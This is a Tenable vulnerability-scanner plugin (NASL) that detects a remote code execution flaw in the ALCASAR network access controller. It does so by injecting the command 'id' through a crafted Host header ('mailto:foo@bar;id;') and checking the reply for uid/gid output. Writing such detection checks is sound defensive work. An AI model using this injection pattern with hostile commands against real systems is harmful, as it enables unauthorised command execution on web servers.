#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(80863);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2016/05/19 17:45:32 $");

  script_bugtraq_id(69662, 69869);
  script_osvdb_id(111026);
  script_xref(name:"EDB-ID", value:"34595");
  script_xref(name:"EDB-ID", value:"34666");

  script_name(english:"ALCASAR 'index.php' Crafted HTTP Header RCE");
  script_summary(english:"Attempts to exploit a RCE flaw.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a remote
code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The ALCASAR network access controller hosted on the remote web server
is affected by a remote code execution vulnerability due to not
properly sanitizing user-supplied input to the 'host' HTTP header
passed to the 'index.php' script. A remote, unauthenticated attacker
can exploit this issue to execute arbitrary commands subject to the
privileges of the web server user.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2014/Sep/26");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2014/Sep/46");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 2.8.1 or later. Note that version 2.8.1 may not
contain a complete fix, and you should confirm its status with the
vendor.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/09/07");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/09/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/01/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:alcasar:alcasar");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015-2016 Tenable Network Security, Inc.");

  script_dependencies("alcasar_detect.nbin");
  script_require_keys("installed_sw/ALCASAR", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "ALCASAR";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

cmd = "id";
file_pat = "(uid=[0-9]+.*gid=[0-9]+.*)";

res = http_send_recv3(
  method       : "GET",
  item         : dir + "/index.php",
  port         : port,
  add_headers  : make_array("Host", "mailto:foo@bar;"+cmd + ";"),
  exit_on_fail : TRUE
);

exp = eregmatch(pattern:file_pat, string:res[2]);

if (!empty_or_null(exp[1]))
{
  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    cmd         : cmd,
    line_limit  : 2,
    request     : make_list(http_last_sent_request()),
    output      : chomp(exp[1])
  );
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
